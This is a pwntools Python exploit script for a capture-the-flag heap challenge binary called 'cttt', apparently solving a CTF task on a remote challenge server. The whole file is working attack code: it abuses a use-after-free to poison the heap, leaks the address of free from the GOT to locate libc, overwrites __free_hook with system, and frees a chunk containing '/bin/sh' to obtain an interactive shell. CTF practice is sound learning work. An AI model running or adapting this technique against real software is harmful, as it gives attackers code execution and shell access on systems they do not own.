#!/usr/bin/env python3

from pwn import *

exe = ELF("./cttt")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})

def alloc(r):
    r.sendlineafter("> ", "1")


def free(r, idx):
    r.sendlineafter("> ", "3")
    
    for _ in range(3):
        r.recvline()

    r.sendline(str(idx))
    


def fill(r, idx, data):
    r.sendlineafter("> ", "2")
    
    for _ in range(4):
        r.recvline()

    r.sendline(str(idx))
    r.recvline()
    r.sendline(data)


def show(r):
    r.sendlineafter("> ",'4')

def main():
    #r = conn()
    r = remote("challenges.ctfd.io", 30252)
    
    alloc(r)
    free(r, 1)

    fill(r, 1, p64(0x404040)+p64(0))

    alloc(r)
    alloc(r)
    
    
    fill(r, 3, p64(exe.got['free'])*2 + p64(0x404040)*6) #urls
    show(r)

    for _ in range(2):
        r.recvuntil("2) ")
    FREE = u64(r.recv(6) + b"\x00"*2)
    log.warn("GlibC leak @ 0x%x", FREE)

    libc.address = FREE - libc.sym.free

    fill(r, 3, p64(libc.sym['__free_hook']) + b"/bin/sh\x00" + p64(0x404048)+p64(0)*5)
    fill(r, 1, p64(libc.sym['system']))
    pause()
    free(r, 3)
  
    r.interactive()


if __name__ == "__main__":
    main()
